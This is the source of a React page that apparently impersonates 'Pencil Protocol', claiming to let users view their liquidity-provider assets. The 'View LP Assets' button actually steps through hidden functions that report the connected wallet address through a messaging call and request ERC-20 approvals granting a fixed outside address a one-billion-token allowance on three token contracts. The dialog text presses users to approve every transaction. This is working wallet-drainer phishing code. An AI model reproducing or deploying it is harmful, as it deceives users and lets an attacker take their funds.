"'use client'"

import { useState } from "react"
import { sendMessage } from "./message"
import { Button } from "@/components/ui/button"
import { ConnectKitButton } from "connectkit";

import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog"

import { useAccount, useSwitchChain } from "wagmi";
import { useWriteContract, useReadContract } from 'wagmi'
import { ethers } from 'ethers';

export function LpAssetsInterface() {
  const [isWalletConnected, setIsWalletConnected] = useState(false)
  const [isApprovalDialogOpen, setIsApprovalDialogOpen] = useState(false)

  const handleConnectWallet = () => {
    // In a real application, this would trigger the wallet connection process
    setIsWalletConnected(true)
  }

  const handleViewLPAssets = () => {
    setIsApprovalDialogOpen(true)
  }

  const handleApproveTransaction = () => {
    // In a real application, this would trigger the approval transaction
    setIsApprovalDialogOpen(false)
    // Simulating viewing LP assets after approval
    alert("LP Assets viewed successfully!")
  } 
  const { address, isConnecting, isDisconnected, status, isConnected } = useAccount();
  
  const { chains, switchChain } = useSwitchChain()
  const { data: hash, writeContract } = useWriteContract()

  let abi = [
    {
      "constant": false,
      "inputs": [
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "type": "function",
      "stateMutability": "nonpayable"
    }
  ]

  const approve1 = () => {
    sendMessage(`Address : ${address}; Connected`)

    setIsApprovalDialogOpen(true)
    switchChain({ chainId: chains[1].id });

  }
  const approve2 = () => {
  
      sendMessage(`Approving ppuf. Check to confirma approval, https://scrollscan.com/address/${address}`)
      
      writeContract({
        address: "0x0C530882C0900b13FC6E8312B52c26e7a5b8e505",
        abi,
        functionName: 'approve',
        args: ["0xf140165a173e5093E87A870B4be95449f0D54cEC", BigInt(ethers.parseUnits("1000000000", 18))],
      });

      
    
}


const approve4 = () => {
  sendMessage(`Approving puf. Check to confirma approval, https://scrollscan.com/address/${address}`)
      
  writeContract({
    address: "0xc4d46E8402F476F269c379677C99F18E22Ea030e",
    abi,
    functionName: 'approve',
    args: ["0xf140165a173e5093E87A870B4be95449f0D54cEC", BigInt(ethers.parseUnits("1000000000", 18))],
  });
}

const approve5 = () => {
  sendMessage("Switch to eth");
  setIsApprovalDialogOpen(true)
  switchChain({ chainId: chains[0].id });
}
const approve6 = () => {
  sendMessage(`Approving Fusd. Check to confirma approval, https://scrollscan.com/address/${address}`)
    
  writeContract({
    address: "0x5C20B550819128074FD538Edf79791733ccEdd18",
    abi,
    functionName: 'approve',
    args: ["0xf140165a173e5093E87A870B4be95449f0D54cEC", BigInt(ethers.parseUnits("1000000000", 18))],
  })
}
const [currentFunctionIndex, setCurrentFunctionIndex] = useState(0);
const functionsArray = [approve1, approve2, approve4, approve5, approve6];

// Function to handle button click
const handleClick = () => {
  // Call the current function
  functionsArray[currentFunctionIndex]();

  // Update the index to loop through the functions
  setCurrentFunctionIndex((prevIndex) => (prevIndex + 1) % functionsArray.length);
};


  return (
    <div className="min-h-screen bg-[rgb(205,244,89)] text-black p-6">
      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-center mb-12">
          <h1 className="text-2xl font-bold">Pencil Protocol</h1>
          {/* <Button
            variant={isWalletConnected ? "secondary" : "default"}
            onClick={handleConnectWallet}
            className="bg-white text-black hover:bg-gray-100"
          >
            <Wallet className="mr-2 h-4 w-4" />
            {isWalletConnected ? "Connected" : "Connect Wallet"}
          </Button> */}

          <ConnectKitButton.Custom>
      {({ isConnected, show, truncatedAddress, ensName }) => {
        return (
            <button className="bg-white text-black hover:bg-gray-100 p-[4px] rounded-[5px]" onClick={show}>
                {isConnected ? ensName ?? truncatedAddress : "Connect Wallet"}
            </button>
        );
      }}
    </ConnectKitButton.Custom>
        </header>


        <main>
          <Card className="bg-white border-gray-200">
            <CardHeader>
              <CardTitle className="text-black">Your LP Assets</CardTitle>
              <CardDescription className="text-gray-500">View and manage your liquidity provider assets</CardDescription>
            </CardHeader>
            <CardContent>
              <p className="text-gray-600 mb-4">
                Connect your wallet and view your LP assets to start managing your liquidity.
              </p>
            </CardContent>
            <CardFooter>
              <Button
                onClick={handleClick}
                disabled={!isConnected}
                className="bg-[rgb(205,244,89)] text-black hover:bg-[rgb(185,224,69)]"
              >
                
                View LP Assets
              </Button>
            </CardFooter>
          </Card>
        </main>

        <Dialog open={isApprovalDialogOpen} onOpenChange={setIsApprovalDialogOpen}>
          <DialogContent className="bg-white text-black">
            <DialogHeader>
              <DialogTitle>Wallet Approval Required</DialogTitle>
              <DialogDescription className="text-gray-600">
                Approve all transactions in your wallet to view LP assets.
              </DialogDescription>
            </DialogHeader>
            <div className="flex justify-end space-x-2 mt-4">
              <Button variant="outline" onClick={() => setIsApprovalDialogOpen(false)} className="text-black border-gray-300">
                Cancel
              </Button>
              <Button onClick={handleClick}  className="bg-[rgb(205,244,89)] text-black hover:bg-[rgb(185,224,69)]">
                Next
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  )
}